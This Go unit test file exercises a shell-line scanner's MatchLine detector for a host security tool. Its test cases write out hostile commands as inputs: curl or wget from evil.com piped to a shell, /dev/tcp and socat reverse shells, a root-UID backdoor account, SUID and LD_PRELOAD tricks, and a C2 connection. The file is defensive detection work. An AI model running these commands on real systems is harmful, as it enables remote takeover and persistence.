/*
©AngelaMos | 2026
patterns_test.go
*/

package scanner

import (
	"testing"

	"github.com/CarterPerez-dev/sentinel/pkg/types"
)

func TestMatchLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		wantHit bool
		wantSev types.Severity
		wantLbl string
	}{
		{
			name:    "clean line",
			line:    "/usr/sbin/sshd -D",
			wantHit: false,
		},
		{
			name:    "curl pipe bash",
			line:    "curl http://evil.com/x | bash",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "download-and-execute chain",
		},
		{
			name:    "wget pipe sh",
			line:    "wget -qO- http://evil.com/x | sh",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "download-and-execute chain",
		},
		{
			name:    "base64 decode",
			line:    "echo dGVzdA== | base64 -d | sh",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "encoded/obfuscated payload",
		},
		{
			name:    "reverse shell dev tcp",
			line:    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "reverse shell pattern",
		},
		{
			name:    "socat reverse shell",
			line:    "socat exec:'bash -li',pty TCP:10.0.0.1:4444",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "reverse shell pattern",
		},
		{
			name:    "temp dir reference",
			line:    "/tmp/.hidden/payload",
			wantHit: true,
			wantSev: types.SeverityMedium,
			wantLbl: "temporary directory reference",
		},
		{
			name:    "dev shm reference",
			line:    "/dev/shm/.evil.so",
			wantHit: true,
			wantSev: types.SeverityMedium,
			wantLbl: "temporary directory reference",
		},
		{
			name:    "alias hijack",
			line:    "alias sudo='/tmp/keylog && sudo'",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "alias hijacking",
		},
		{
			name:    "LD_PRELOAD export",
			line:    "export LD_PRELOAD=/dev/shm/.evil.so",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "LD_PRELOAD manipulation",
		},
		{
			name:    "nohup background",
			line:    "nohup /tmp/.hidden/beacon &",
			wantHit: true,
			wantSev: types.SeverityMedium,
		},
		{
			name:    "python socket",
			line:    "python3 -c 'import socket'",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "reverse shell pattern",
		},
		{
			name:    "PATH to tmp",
			line:    "PATH=/tmp/evil:$PATH",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "PATH manipulation to temp dir",
		},
		{
			name:    "normal path export",
			line:    "export PATH=/usr/local/bin:$PATH",
			wantHit: false,
		},
		{
			name:    "comment with keyword",
			line:    "# curl http://example.com",
			wantHit: true,
			wantSev: types.SeverityMedium,
			wantLbl: "network tool invocation",
		},
		{
			name:    "chmod suid",
			line:    "chmod u+s /tmp/.hidden/shell",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "SUID bit manipulation",
		},
		{
			name:    "chmod numeric suid",
			line:    "chmod 4755 /usr/local/bin/backdoor",
			wantHit: true,
			wantSev: types.SeverityCritical,
			wantLbl: "SUID bit manipulation",
		},
		{
			name:    "useradd backdoor",
			line:    "useradd -o -u 0 -g root backdoor",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "account creation/modification",
		},
		{
			name:    "chattr immutable",
			line:    "chattr +i /etc/resolv.conf",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "file attribute manipulation",
		},
		{
			name:    "systemctl enable persistence",
			line:    "systemctl enable backdoor.service",
			wantHit: true,
			wantSev: types.SeverityMedium,
			wantLbl: "persistence self-installation",
		},
		{
			name:    "openssl c2 channel",
			line:    "openssl s_client -connect c2.evil.com:443",
			wantHit: true,
			wantSev: types.SeverityHigh,
			wantLbl: "encrypted C2 channel",
		},
		{
			name:    "normal chmod",
			line:    "chmod 755 /usr/local/bin/app",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hit, sev, lbl := MatchLine(tt.line)
			if hit != tt.wantHit {
				t.Errorf(
					"MatchLine(%q) hit = %v, want %v",
					tt.line, hit, tt.wantHit,
				)
			}
			if tt.wantHit && sev < tt.wantSev {
				t.Errorf(
					"MatchLine(%q) sev = %v, want >= %v",
					tt.line, sev, tt.wantSev,
				)
			}
			if tt.wantLbl != "" && lbl != tt.wantLbl {
				t.Errorf(
					"MatchLine(%q) label = %q, want %q",
					tt.line, lbl, tt.wantLbl,
				)
			}
		})
	}
}
